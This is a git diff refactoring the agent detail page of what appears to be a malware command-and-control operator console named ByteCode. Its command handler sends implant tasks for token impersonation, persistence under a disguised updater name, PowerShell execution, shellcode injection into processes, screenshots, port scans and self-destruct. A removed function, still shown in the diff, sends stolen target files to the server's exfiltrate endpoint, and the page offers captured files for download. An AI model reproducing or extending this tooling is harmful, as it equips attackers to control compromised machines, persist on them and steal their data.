@@ -27,10 +27,8 @@ import {
   Download,
   Activity as ActivityIcon,
   Search,
-  Database,
-  ChevronDown
+  Database
 } from 'lucide-react';
-
 import { agentsApi, tasksApi } from '../utils/api';
 import { format, formatDistanceToNow } from 'date-fns';
 
@@ -60,7 +58,6 @@ const AgentDetailPage = () => {
     return localStorage.getItem(`bytecode_clear_${id}`) || null;
   });
 
-
   const lastResultsLength = useRef(0);
   const resultEndRef = useRef(null);
 
@@ -72,39 +69,31 @@ const AgentDetailPage = () => {
     }, 4000);
   }, []);
 
-
   const fetchDetails = useCallback(async () => {
     try {
       const details = await agentsApi.get(id);
       setData(details);
       
-      // Clean up pending tasks and notify
       setPendingTasks(prev => {
         const now = new Date();
         const results = details.results || [];
-        
-        // 1. Find completed tasks
         const completed = prev.filter(pt => 
           results.some(r => String(r.task_id) === String(pt.id))
         );
         
         completed.forEach(task => {
           const result = results.find(r => String(r.task_id) === String(task.id));
+          const typeStr = (task.task_type || '').replace('_json', '');
           addToast(
-            `Task ${task.task_type.replace('_json', '')} ${result.status === 'success' ? 'completed' : 'failed'}`, 
-            result.status === 'success' ? 'success' : 'error'
+            `Task ${typeStr || 'action'} ${result?.status === 'success' ? 'completed' : 'failed'}`, 
+            result?.status === 'success' ? 'success' : 'error'
           );
         });
 
-        // 2. Filter out completed and stale tasks
         return prev.filter(pt => {
           const isCompleted = results.some(r => String(r.task_id) === String(pt.id));
           const isStale = (now - new Date(pt.created_at)) > 30000;
-          
-          if (isStale && !isCompleted) {
-            addToast(`Task ${pt.task_type} timed out`, 'error');
-          }
-          
+          if (isStale && !isCompleted) addToast(`Task ${pt.task_type || 'unknown'} timed out`, 'error');
           return !isCompleted && !isStale;
         });
       });
@@ -117,34 +106,19 @@ const AgentDetailPage = () => {
 
   useEffect(() => {
     let isMounted = true;
-    
-    const init = async () => {
-      if (isMounted) {
-        await fetchDetails();
-      }
-    };
-
+    const init = async () => { if (isMounted) await fetchDetails(); };
     init();
-    const interval = setInterval(fetchDetails, 3000); // Faster refresh for better UX
-    
-    return () => {
-      isMounted = false;
-      clearInterval(interval);
-    };
+    const interval = setInterval(fetchDetails, 3000);
+    return () => { isMounted = false; clearInterval(interval); };
   }, [fetchDetails]);
 
   const handleQuickAction = useCallback(async (type, payload) => {
     const targetType = type === 'ls' ? 'ls_json' : type;
     try {
       const result = await tasksApi.create(id, targetType, payload);
-
-      // Add to pending for immediate feedback
       const taskObj = result.task || result;
       const pushed = result.pushed;
-
-      if (pushed) {
-        addToast(`Real-time dispatch: ${targetType.replace('_json', '')}`, 'success');
-      }
+      if (pushed) addToast(`Real-time dispatch: ${targetType.replace('_json', '')}`, 'success');
 
       setPendingTasks(prev => [...prev, {
         id: taskObj.id,
@@ -154,30 +128,19 @@ const AgentDetailPage = () => {
         created_at: new Date().toISOString(),
         pushed: pushed
       }]);
-      
-      // Trigger immediate refresh
       fetchDetails();
-      
       return result;
-
     } catch (err) {
       alert(err.message);
     }
   }, [id, fetchDetails, addToast]);
 
-
-  // Real-Time Heartbeat Monitor
   useEffect(() => {
     if (!isMonitoring) return;
-
     const monitor = setInterval(() => {
-      if (activeTab === 'processes') {
-        handleQuickAction('ps_json', {});
-      } else if (activeTab === 'network') {
-        handleQuickAction('netstat_json', {});
-      }
+      if (activeTab === 'processes') handleQuickAction('ps_json', {});
+      else if (activeTab === 'network') handleQuickAction('netstat_json', {});
     }, 5000);
-
     return () => clearInterval(monitor);
   }, [isMonitoring, activeTab, id, handleQuickAction]);
 
@@ -191,42 +154,12 @@ const AgentDetailPage = () => {
     }
   }, [data?.results, pendingTasks.length, autoScroll, activeTab]);
 
-  const handleExfiltrate = async (file) => {
-    try {
-      const fullPath = joinPath(getLatestLsResult()?.path, file.name);
-      const serverUrl = window.location.origin;
-      
-      const result = await tasksApi.create(id, 'upload_url', { 
-        path: fullPath,
-        url: `${serverUrl}/api/exfiltrate/${id}/__TASK_ID__/${file.name}`
-      });
-
-      const taskObj = result.task || result;
-      addToast(`Exfiltration mission started: ${file.name}`, 'info');
-      
-      setPendingTasks(prev => [...prev, {
-        id: taskObj.id,
-        task_type: 'exfiltration',
-        task_payload: JSON.stringify({ path: fullPath }),
-        status: 'pending',
-        created_at: new Date().toISOString()
-      }]);
-
-      fetchDetails();
-    } catch (err) {
-      console.error(err);
-      addToast('Exfiltration failed to initialize', 'error');
-    }
-  };
-
   const handleKillAgent = async () => {
     if (window.confirm('Are you sure you want to terminate this agent? It will no longer respond to beacons.')) {
       try {
         await agentsApi.kill(id);
         navigate('/agents');
-      } catch (err) {
-        alert(err.message);
-      }
+      } catch (err) { alert(err.message); }
     }
   };
 
@@ -241,143 +174,55 @@ const AgentDetailPage = () => {
     let taskType = 'execute_command';
     let payload = { command };
 
-    // Tactical Command Mapping
     switch (cmd) {
       case 'clear': {
-        const sortedResults = [...results].sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
+        const sortedResults = [...(data?.results || [])].sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
         const allItems = [...sortedResults, ...pendingTasks].sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
         const latestItem = allItems[allItems.length - 1];
-        // Set clear point to the latest item's timestamp (or now if empty)
         const clearPoint = latestItem ? latestItem.created_at : new Date().toISOString();
-        
         setClearedAt(clearPoint);
         localStorage.setItem(`bytecode_clear_${id}`, clearPoint);
         setCommand('');
         return;
       }
-      case 'getprivs':
-        taskType = 'getprivs';
-        payload = {};
-        break;
+      case 'getprivs': taskType = 'getprivs'; payload = {}; break;
       case 'impersonate':
-        if (args.length < 1) {
-          addToast('Usage: impersonate <pid>', 'error');
-          return;
-        }
-        taskType = 'impersonate';
-        payload = { pid: parseInt(args[0]) };
-        break;
-      case 'revert_self':
-        taskType = 'revert_self';
-        payload = {};
-        break;
-      case 'ps':
-        taskType = 'ps_json';
-        payload = {};
-        break;
-      case 'ls':
-        taskType = 'ls_json';
-        payload = { path: args[0] || '.' };
-        break;
-      case 'screenshot':
-        taskType = 'screenshot';
-        payload = {};
-        break;
+        if (args.length < 1) return addToast('Usage: impersonate <pid>', 'error');
+        taskType = 'impersonate'; payload = { pid: parseInt(args[0]) }; break;
+      case 'revert_self': taskType = 'revert_self'; payload = {}; break;
+      case 'ps': taskType = 'ps_json'; payload = {}; break;
+      case 'ls': taskType = 'ls_json'; payload = { path: args[0] || '.' }; break;
+      case 'screenshot': taskType = 'screenshot'; payload = {}; break;
       case 'self_destruct':
         if (!confirm('Are you sure? This will remove the agent from the target.')) return;
-        taskType = 'self_destruct';
-        payload = {};
-        break;
-      case 'netstat':
-        taskType = 'netstat_json';
-        payload = {};
-        break;
+        taskType = 'self_destruct'; payload = {}; break;
+      case 'netstat': taskType = 'netstat_json'; payload = {}; break;
       case 'portscan':
-        if (args.length < 1) {
-          addToast('Usage: portscan <target> [ports]', 'error');
-          return;
-        }
-        taskType = 'portscan';
-        payload = { target: args[0], ports: args[1] || '1-1024' };
-        break;
+        if (args.length < 1) return addToast('Usage: portscan <target> [ports]', 'error');
+        taskType = 'portscan'; payload = { target: args[0], ports: args[1] || '1-1024' }; break;
       case 'persist':
-        taskType = 'persist';
-        payload = { name: args[0] || 'ByteCodeUpdater', path: args[1] || 'C:\\Windows\\Temp\\bytecode.exe' };
-        break;
-      case 'unpersist':
-        taskType = 'unpersist';
-        payload = { name: args[0] || 'ByteCodeUpdater' };
-        break;
-      case 'getenv':
-        taskType = 'getenv';
-        payload = {};
-        break;
+        taskType = 'persist'; payload = { name: args[0] || 'ByteCodeUpdater', path: args[1] || 'C:\\Windows\\Temp\\bytecode.exe' }; break;
+      case 'unpersist': taskType = 'unpersist'; payload = { name: args[0] || 'ByteCodeUpdater' }; break;
+      case 'getenv': taskType = 'getenv'; payload = {}; break;
       case 'powershell':
-        if (args.length < 1) {
-          addToast('Usage: powershell <script_block>', 'error');
-          return;
-        }
-        taskType = 'powershell';
-        payload = { command: args.join(' ') };
-        break;
+        if (args.length < 1) return addToast('Usage: powershell <script_block>', 'error');
+        taskType = 'powershell'; payload = { command: args.join(' ') }; break;
       case 'inject':
-        if (args.length < 2) {
-          addToast('Usage: inject <pid> <base64_shellcode>', 'error');
-          return;
-        }
-        taskType = 'inject';
-        payload = { pid: parseInt(args[0]), shellcode: args[1] };
-        break;
-      case 'mkdir':
-        if (args.length < 1) {
-          addToast('Usage: mkdir <path>', 'error');
-          return;
-        }
-        taskType = 'mkdir';
-        payload = { path: args[0] };
-        break;
-      case 'rm':
-        if (args.length < 1) {
-          addToast('Usage: rm <path>', 'error');
-          return;
-        }
-        taskType = 'rm';
-        payload = { path: args[0] };
-        break;
-      case 'cp':
-        if (args.length < 2) {
-          addToast('Usage: cp <src> <dest>', 'error');
-          return;
-        }
-        taskType = 'cp';
-        payload = { src: args[0], dest: args[1] };
-        break;
-      case 'mv':
-        if (args.length < 2) {
-          addToast('Usage: mv <src> <dest>', 'error');
-          return;
-        }
-        taskType = 'mv';
-        payload = { src: args[0], dest: args[1] };
-        break;
-      case 'cat':
-        if (args.length < 1) {
-          addToast('Usage: cat <path>', 'error');
-          return;
-        }
-        taskType = 'cat';
-        payload = { path: args[0] };
-        break;
+        if (args.length < 2) return addToast('Usage: inject <pid> <base64_shellcode>', 'error');
+        taskType = 'inject'; payload = { pid: parseInt(args[0]), shellcode: args[1] }; break;
+      case 'mkdir': if (args.length < 1) return addToast('Usage: mkdir <path>', 'error'); taskType = 'mkdir'; payload = { path: args[0] }; break;
+      case 'rm': if (args.length < 1) return addToast('Usage: rm <path>', 'error'); taskType = 'rm'; payload = { path: args[0] }; break;
+      case 'cp': if (args.length < 2) return addToast('Usage: cp <src> <dest>', 'error'); taskType = 'cp'; payload = { src: args[0], dest: args[1] }; break;
+      case 'mv': if (args.length < 2) return addToast('Usage: mv <src> <dest>', 'error'); taskType = 'mv'; payload = { src: args[0], dest: args[1] }; break;
+      case 'cat': if (args.length < 1) return addToast('Usage: cat <path>', 'error'); taskType = 'cat'; payload = { path: args[0] }; break;
       case 'help':
         addToast('Commands: getprivs, impersonate, revert_self, ps, ls, screenshot, netstat, portscan, persist, unpersist, getenv, powershell, inject, mkdir, rm, cp, mv, cat, self_destruct', 'info');
-        setCommand('');
-        return;
+        setCommand(''); return;
     }
 
     setExecuting(true);
     try {
       const result = await tasksApi.create(id, taskType, payload);
-      
       const taskObj = result.task || result;
       setPendingTasks(prev => [...prev, {
         id: taskObj.id,
@@ -386,12 +231,10 @@ const AgentDetailPage = () => {
         status: 'pending',
         created_at: new Date().toISOString()
       }]);
-
       setCommandHistory(prev => [command, ...prev].slice(0, 50));
       setHistoryIndex(-1);
       setCommand('');
       addToast(`Task dispatched: ${taskType}`, 'success');
-      
       fetchDetails();
     } catch (err) {
       console.error(err);
@@ -424,632 +267,315 @@ const AgentDetailPage = () => {
     if (res.output && res.output.startsWith('SCREENSHOT:')) {
       const dataUri = res.output.replace('SCREENSHOT:', '');
       return (
-        <div className="space-y-2">
-          <div className="text-slate-400 text-xs italic italic">Screenshot captured</div>
-          <img 
-            src={dataUri} 
-            alt="Screenshot" 
-            className="rounded-lg border border-slate-800 max-w-full hover:scale-105 transition-transform cursor-zoom-in" 
-            onClick={() => window.open(dataUri)}
-          />
+        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
+          <span style={{ fontSize: 11, color: 'var(--color-text-muted)' }}>Screenshot captured</span>
+          <img src={dataUri} alt="Screenshot" style={{ borderRadius: 8, border: '1px solid var(--color-border)', maxWidth: '100%', cursor: 'zoom-in' }} onClick={() => window.open(dataUri)} />
         </div>
       );
     }
 
     if (res.output && res.output.startsWith('FILE_EXFILTRATED:')) {
       const fullPath = res.output.replace('FILE_EXFILTRATED:', '');
-      const filename = fullPath.split(/[\\/]/).pop().split('_').slice(1).join('_');
       const fileBasename = fullPath.split(/[\\/]/).pop();
-      
+      const filename = fileBasename.split('_').slice(1).join('_') || fileBasename;
       return (
-        <div className="p-4 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-between group">
-          <div className="flex items-center gap-4">
-            <div className="p-3 bg-primary/20 rounded-xl text-primary group-hover:scale-110 transition-transform">
-              <Download className="w-6 h-6" />
-            </div>
+        <div style={{ padding: 14, borderRadius: 8, background: 'var(--color-surface-raised)', border: '1px solid var(--color-border)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+            <Download size={18} style={{ color: 'var(--color-primary)' }} />
             <div>
-              <div className="text-[10px] font-black text-primary uppercase tracking-[0.2em] mb-1">File Captured</div>
-              <div className="text-sm font-bold text-white">{filename}</div>
+              <div style={{ fontSize: 10, fontWeight: 600, color: 'var(--color-primary)', textTransform: 'uppercase' }}>File Captured</div>
+              <div style={{ fontSize: 12, fontWeight: 600, color: 'var(--color-text-header)' }}>{filename}</div>
             </div>
           </div>
-          <button 
-            onClick={async () => {
-              try {
-                const response = await tasksApi.download(id, fileBasename);
-                if (!response.ok) {
-                  const errorData = await response.json().catch(() => ({}));
-                  throw new Error(errorData.error || `Server returned ${response.status}`);
-                }
-                const blob = await response.blob();
-                const typedBlob = new Blob([blob], { type: 'application/octet-stream' });
-                const url = window.URL.createObjectURL(typedBlob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = filename;
-                document.body.appendChild(a);
-                a.click();
-                window.URL.revokeObjectURL(url);
-                document.body.removeChild(a);
-              } catch (err) {
-                console.error('Download error:', err);
-                alert(`Download failed: ${err.message}`);
-              }
-            }}
-            className="px-6 py-2.5 rounded-xl bg-primary text-white text-[10px] font-black uppercase tracking-[0.2em] hover:bg-primary-hover transition-all shadow-lg shadow-primary/20"
-          >
-            Download to Local
-          </button>
+          <button onClick={async () => {
+            try {
+              const response = await tasksApi.download(id, fileBasename);
+              if (!response.ok) throw new Error('Download failed');
+              const blob = await response.blob();
+              const url = window.URL.createObjectURL(blob);
+              const a = document.createElement('a'); a.href = url; a.download = filename;
+              document.body.appendChild(a); a.click(); window.URL.revokeObjectURL(url); document.body.removeChild(a);
+            } catch (err) { alert(err.message); }
+          }} className="btn btn-primary" style={{ fontSize: 11 }}>Download File</button>
         </div>
       );
     }
 
-    // Binary Detection for 'cat' commands
-    if (res.task_type === 'cat' && output && (output.startsWith('%PDF-') || output.includes(''))) {
-      const payload = typeof res.task_payload === 'string' ? JSON.parse(res.task_payload) : (res.task_payload || {});
-      const fileName = payload.path ? payload.path.split(/[\\/]/).pop() : 'Binary File';
-      
-      // Generate a hex preview of the first 256 bytes (or whatever is in the output)
-      const generateHexPreview = (text) => {
-        const hex = [];
-        const chars = [];
-        const maxLen = Math.min(text.length, 256);
-        
-        for (let i = 0; i < maxLen; i++) {
-          const charCode = text.charCodeAt(i);
-          hex.push(charCode.toString(16).padStart(2, '0').toUpperCase());
-          chars.push(charCode >= 32 && charCode <= 126 ? text[i] : '.');
-        }
-        
-        const rows = [];
-        for (let i = 0; i < hex.length; i += 16) {
-          const hexRow = hex.slice(i, i + 16).join(' ');
-          const charRow = chars.slice(i, i + 16).join('');
-          rows.push(`${(i).toString(16).padStart(8, '0')}  ${hexRow.padEnd(47)}  |${charRow}|`);
-        }
-        return rows.join('\n');
-      };
+    const isBinaryOrDownload = res.task_type === 'download' || 
+      (res.output && (res.output.startsWith('PK\x03\x04') || res.output.startsWith('PK\x05\x06') || res.output.startsWith('%PDF') || res.output.startsWith('\x7fELF') || res.output.startsWith('MZ')));
+
+    if (isBinaryOrDownload) {
+      let payloadObj = {};
+      try { payloadObj = typeof res.task_payload === 'string' ? JSON.parse(res.task_payload) : (res.task_payload || {}); } catch(e) {}
+      const targetPath = payloadObj.path || 'exfiltrated_file';
+      const filename = targetPath.split(/[\\/]/).pop() || 'file.bin';
 
       return (
-        <div className="p-6 rounded-2xl bg-amber-500/10 border border-amber-500/20 flex flex-col gap-6">
-          <div className="flex items-center gap-4">
-            <div className="p-3 bg-amber-500/20 rounded-xl text-amber-500">
-              <AlertCircle className="w-6 h-6" />
-            </div>
+        <div style={{ padding: 14, borderRadius: 8, background: 'var(--color-surface-raised)', border: '1px solid var(--color-border)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+            <Download size={18} style={{ color: 'var(--color-primary)' }} />
             <div>
-              <div className="text-[10px] font-black text-amber-500 uppercase tracking-[0.2em] mb-1">Binary Stream Detected</div>
-              <div className="text-sm font-bold text-white">Console cannot render raw binary data for: {fileName}</div>
+              <div style={{ fontSize: 10, fontWeight: 600, color: 'var(--color-primary)', textTransform: 'uppercase' }}>File Captured</div>
+              <div style={{ fontSize: 12, fontWeight: 600, color: 'var(--color-text-header)' }}>{filename}</div>
+              <div style={{ fontSize: 10, color: 'var(--color-text-dim)', fontFamily: 'var(--font-mono)' }}>{targetPath}</div>
             </div>
           </div>
-
-          <div className="space-y-2">
-             <div className="text-[9px] font-black text-slate-500 uppercase tracking-widest pl-1">Data Preview (First 256 Bytes)</div>
-             <pre className="p-4 bg-black/60 rounded-xl border border-slate-800/50 font-mono text-[10px] text-emerald-500/80 leading-relaxed overflow-x-auto shadow-inner">
-               {generateHexPreview(output)}
-             </pre>
-          </div>
-
-          <div className="flex gap-3">
-            <button 
-              onClick={() => handleExfiltrate({ name: fileName })}
-              className="px-6 py-2.5 rounded-xl bg-amber-500 text-black text-[10px] font-black uppercase tracking-[0.2em] hover:bg-amber-400 transition-all shadow-lg shadow-amber-500/20 flex items-center gap-2"
-            >
-              <Download className="w-3.5 h-3.5" /> Full Exfiltration
-            </button>
-            <div className="flex-1 p-3 bg-black/40 rounded-xl font-mono text-[10px] text-slate-500 border border-slate-800">
-              Binary data detected. Use exfiltration to retrieve the full asset for local analysis.
-            </div>
-          </div>
+          <button onClick={() => {
+            const blob = new Blob([res.output], { type: 'application/octet-stream' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a'); a.href = url; a.download = filename;
+            document.body.appendChild(a); a.click(); window.URL.revokeObjectURL(url); document.body.removeChild(a);
+          }} className="btn btn-primary" style={{ fontSize: 11 }}>Download File</button>
         </div>
       );
     }
 
-    // Smart JSON detection and rendering
     if (res.output && (res.output.trim().startsWith('{') || res.output.trim().startsWith('['))) {
       try {
         const parsed = JSON.parse(res.output);
-        
-        // If it's a simple list (like process info or system info)
-        if (Array.isArray(parsed) || typeof parsed === 'object') {
-          return (
-            <div className="bg-slate-900/40 rounded-xl border border-slate-800/50 overflow-hidden">
-              <div className="px-4 py-2 border-b border-slate-800/50 bg-slate-900/60 flex items-center justify-between">
-                <span className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Parsed Data Output</span>
-                <button 
-                  onClick={() => {
-                    const blob = new Blob([res.output], { type: 'application/json' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = `result_${res.id}.json`;
-                    a.click();
-                  }}
-                  className="text-[9px] font-bold text-primary hover:text-white transition-colors"
-                >
-                  Export Raw
-                </button>
-              </div>
-              <div className="p-4 max-h-[400px] overflow-y-auto scrollbar-thin">
-                 {/* Prettified JSON view */}
-                 <pre className="text-[11px] text-emerald-500/90 font-mono leading-relaxed">
-                   {JSON.stringify(parsed, null, 2)}
-                 </pre>
-              </div>
+        return (
+          <div style={{ background: 'var(--color-background)', borderRadius: 8, border: '1px solid var(--color-border-muted)', overflow: 'hidden' }}>
+            <div style={{ padding: '6px 12px', background: 'var(--color-surface-raised)', borderBottom: '1px solid var(--color-border-muted)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+              <span style={{ fontSize: 10, fontWeight: 600, color: 'var(--color-text-dim)', textTransform: 'uppercase' }}>JSON Output</span>
+              <button onClick={() => {
+                const blob = new Blob([res.output], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a'); a.href = url; a.download = `result_${res.id}.json`; a.click();
+              }} style={{ background: 'none', border: 'none', color: 'var(--color-primary)', fontSize: 10, cursor: 'pointer', fontWeight: 600 }}>Export</button>
             </div>
-          );
-        }
-      } catch {
-        // Not valid JSON, fall back to default
-      }
-
+            <pre style={{ padding: 12, fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--color-text)', margin: 0, overflowX: 'auto' }}>
+              {JSON.stringify(parsed, null, 2)}
+            </pre>
+          </div>
+        );
+      } catch {}
     }
 
     return (
-      <pre className="whitespace-pre-wrap text-slate-300 bg-slate-900/30 p-4 rounded-xl border border-slate-800/30 overflow-x-auto font-mono text-[11px] leading-relaxed shadow-inner">
+      <pre style={{ margin: 0, padding: 12, borderRadius: 8, background: 'var(--color-background)', border: '1px solid var(--color-border-muted)', fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--color-text)', whiteSpace: 'pre-wrap', lineHeight: 1.6 }}>
         {res.output || (res.error ? `ERROR: ${res.error}` : 'No output')}
       </pre>
     );
-
   };
 
   const agent = data?.agent;
   const results = data?.results || [];
-  const isOnline = agent && (new Date() - new Date(agent.last_seen)) < 120000;
-
+  const isOnline = agent && agent.connection_status === 'online';
 
   const psList = useMemo(() => {
-    const results = data?.results || [];
     const res = [...results].reverse().find(r => r.task_type === 'ps_json' && r.status === 'success');
-    try { return res ? JSON.parse(res.output) : null; } catch { return null; }
-  }, [data?.results]);
+    try { const parsed = res ? JSON.parse(res.output) : null; return Array.isArray(parsed) ? parsed : null; }
+    catch { return null; }
+  }, [results]);
 
   const netList = useMemo(() => {
-    const results = data?.results || [];
     const res = [...results].reverse().find(r => r.task_type === 'netstat_json' && r.status === 'success');
-    try { return res ? JSON.parse(res.output) : null; } catch { return null; }
-  }, [data?.results]);
+    try { const parsed = res ? JSON.parse(res.output) : null; return Array.isArray(parsed) ? parsed : null; }
+    catch { return null; }
+  }, [results]);
 
-  useEffect(() => {
-    if (psList && psList.length > 0) {
-      if (seenPsPids.current.size === 0) {
-        // Initial load: mark all as seen, no highlights
-        psList.forEach(p => seenPsPids.current.add(p.pid));
-      } else if (isMonitoring) {
-        // Subsequent load: find truly new ones
-        const newPids = new Set();
-        psList.forEach(p => {
-          if (!seenPsPids.current.has(p.pid)) {
-            newPids.add(p.pid);
-            seenPsPids.current.add(p.pid);
-          }
-        });
-        if (newPids.size > 0) {
-          setHighlightedPids(prev => new Set([...prev, ...newPids]));
-          // Optional: clear highlights after 10 seconds
-          setTimeout(() => {
-            setHighlightedPids(prev => {
-              const next = new Set(prev);
-              newPids.forEach(id => next.delete(id));
-              return next;
-            });
-          }, 10000);
-        }
-      }
-    }
-  }, [psList, isMonitoring]);
+  const getLatestLsResult = () => {
+    const lsRes = [...results].reverse().find(r => r.task_type === 'ls_json' && r.status === 'success');
+    if (!lsRes) return null;
+    try {
+      const parsed = JSON.parse(lsRes.output);
+      if (!parsed || !Array.isArray(parsed.files)) return null;
+      return parsed;
+    } catch { return null; }
+  };
 
-  useEffect(() => {
-    if (netList && netList.length > 0) {
-      if (seenNetKeys.current.size === 0) {
-        // Initial load: mark all as seen
-        netList.forEach(c => seenNetKeys.current.add(`${c.local}-${c.remote}`));
-      } else if (isMonitoring) {
-        const newKeys = new Set();
-        netList.forEach(c => {
-          const key = `${c.local}-${c.remote}`;
-          if (!seenNetKeys.current.has(key)) {
-            newKeys.add(key);
-            seenNetKeys.current.add(key);
-          }
-        });
-        if (newKeys.size > 0) {
-          setHighlightedNetKeys(prev => new Set([...prev, ...newKeys]));
-          setTimeout(() => {
-            setHighlightedNetKeys(prev => {
-              const next = new Set(prev);
-              newKeys.forEach(id => next.delete(id));
-              return next;
-            });
-          }, 10000);
-        }
-      }
-    }
-  }, [netList, isMonitoring]);
+  const joinPath = (base, addition) => {
+    if (!base || base === '.') return addition;
+    const isWindows = base.includes('\\') || (agent?.os === 'windows');
+    const separator = isWindows ? '\\' : '/';
+    let cleanBase = base.endsWith(separator) ? base.slice(0, -1) : base;
+    return `${cleanBase}${separator}${addition}`;
+  };
 
-
-
-
-  if (!data) {
+  if (!data || !agent) {
     return (
-      <div className="h-full flex items-center justify-center bg-[#05070a]">
+      <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'var(--color-background)' }}>
         {loading ? (
-          <div className="flex flex-col items-center gap-4">
-            <Loader2 className="w-8 h-8 text-primary animate-spin" />
-            <p className="text-[11px] font-bold text-slate-500 uppercase tracking-widest">Establishing secure connection...</p>
+          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 12 }}>
+            <Loader2 size={24} style={{ color: 'var(--color-primary)', animation: 'spin 1s linear infinite' }} />
+            <p style={{ fontSize: 11, fontWeight: 600, color: 'var(--color-text-dim)', textTransform: 'uppercase', letterSpacing: '0.1em' }}>Connecting...</p>
           </div>
         ) : (
-          <div className="flex flex-col items-center gap-6 p-12 rounded-3xl bg-red-500/5 border border-red-500/10">
-            <AlertCircle className="w-12 h-12 text-red-500/50" />
-            <div className="text-center">
-              <h3 className="text-white font-bold mb-2">Connection Failed</h3>
-              <p className="text-xs text-slate-500 max-w-xs">Unable to establish a link with the endpoint. The device may be offline or unreachable.</p>
+          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 16, padding: 40, borderRadius: 14, background: 'var(--color-surface)', border: '1px solid var(--color-border)' }}>
+            <AlertCircle size={32} style={{ color: 'var(--color-error)' }} />
+            <div style={{ textAlign: 'center' }}>
+              <h3 style={{ fontSize: 14, fontWeight: 600, color: 'var(--color-text-header)', marginBottom: 4 }}>Endpoint Unavailable</h3>
+              <p style={{ fontSize: 12, color: 'var(--color-text-muted)' }}>Could not load data for this agent.</p>
             </div>
-            <button 
-              onClick={() => navigate('/agents')}
-              className="px-6 py-2.5 rounded-xl bg-slate-900 border border-slate-800 text-slate-300 text-[10px] font-black uppercase tracking-widest hover:bg-slate-800 transition-all"
-            >
-              Return to Dashboard
-            </button>
+            <button onClick={() => navigate('/agents')} className="btn btn-secondary">Back to Endpoints</button>
           </div>
         )}
       </div>
     );
   }
 
-  // Data is guaranteed to exist beyond this point
-
-
-
-  const getLatestPsResult = () => psList;
-  const getLatestNetstatResult = () => netList;
-
-  const getLatestLsResult = () => {
-    const lsRes = [...results].reverse().find(r => r.task_type === 'ls_json' && r.status === 'success');
-    if (!lsRes) return null;
-    try {
-      return JSON.parse(lsRes.output);
-    } catch {
-      return null;
-    }
-  };
-
-  const formatFileSize = (bytes) => {
-    if (bytes === 0) return '0 B';
-    const k = 1024;
-    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
-    const i = Math.floor(Math.log(bytes) / Math.log(k));
-    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-  };
-
-  const joinPath = (base, addition) => {
-    if (!base || base === '.') return addition;
-    const isWindows = base.includes('\\') || (agent.os === 'windows');
-    const separator = isWindows ? '\\' : '/';
-    
-    // Clean up base
-    let cleanBase = base;
-    if (cleanBase.endsWith(separator)) {
-      cleanBase = cleanBase.slice(0, -1);
-    }
-    
-    return `${cleanBase}${separator}${addition}`;
-  };
-
-
   return (
-    <div className="flex-1 h-full overflow-hidden flex flex-col bg-[#05070a]">
-      {/* Top Header Strip */}
-      <div className="shrink-0 h-16 border-b border-border bg-surface/50 backdrop-blur-md flex items-center justify-between px-8 z-30">
-        <div className="flex items-center gap-6">
-          <button 
-            onClick={() => setSidebarCollapsed(!sidebarCollapsed)}
-            className={`p-2 rounded-xl transition-all ${sidebarCollapsed ? 'bg-primary/10 text-primary' : 'text-slate-500 hover:text-white'}`}
-            title="Toggle Info Panel"
-          >
-            <ActivityIcon className="w-5 h-5" />
+    <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minHeight: 0, background: 'var(--color-background)' }}>
+      {/* ── Top Header Strip ── */}
+      <div className="topbar">
+        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+          <button onClick={() => navigate('/agents')} className="btn btn-secondary" style={{ padding: '4px 8px' }}>
+            <ChevronLeft size={14} /> Back
           </button>
-          
-          <div className="h-8 w-px bg-slate-800/50" />
-
-        <div className="flex items-center gap-4">
-          <button 
-            onClick={() => navigate(-1)}
-            className="p-2 rounded-lg hover:bg-white/5 text-slate-500 hover:text-white transition-all group"
-          >
-            <ChevronLeft className="w-5 h-5 group-hover:-translate-x-0.5 transition-transform" />
+          <button onClick={() => setSidebarCollapsed(!sidebarCollapsed)} className="btn btn-secondary" style={{ padding: '4px 8px' }} title="Toggle info panel">
+            <ActivityIcon size={14} />
           </button>
-          
-          <div className="h-8 w-px bg-border" />
-
-          <div>
-            <div className="flex items-center gap-2">
-              <h1 className="text-sm font-bold text-white tracking-tight">{agent.hostname}</h1>
-              <div className={`w-2 h-2 rounded-full ${agent.connection_status === 'online' ? 'bg-success shadow-[0_0_8px_var(--color-success)]' : 'bg-slate-700'}`} />
-            </div>
-            <p className="text-[11px] font-mono text-slate-500 leading-none mt-1">{agent.id}</p>
-          </div>
-        </div>
         </div>
 
+        <div style={{ display: 'flex', alignItems: 'center', gap: 8, flex: 1, marginLeft: 8 }}>
+          <div className={`agent-dot ${isOnline ? 'online' : ''}`} />
+          <span style={{ fontSize: 13, fontWeight: 700, color: 'var(--color-text-header)' }}>{agent.hostname}</span>
+          <span style={{ fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--color-text-dim)' }}>({agent.id})</span>
+        </div>
 
-        <div className="flex items-center gap-8">
-          <div className="flex flex-col items-end">
-            <span className="text-[8px] font-black text-slate-500 uppercase tracking-widest mb-0.5">Last Contact</span>
-            <div className="flex items-center gap-2">
-              <div className={`w-1.5 h-1.5 rounded-full ${agent.connection_status === 'online' ? 'bg-sky-400 shadow-[0_0_8px_#38bdf8]' : 'bg-slate-700'}`} />
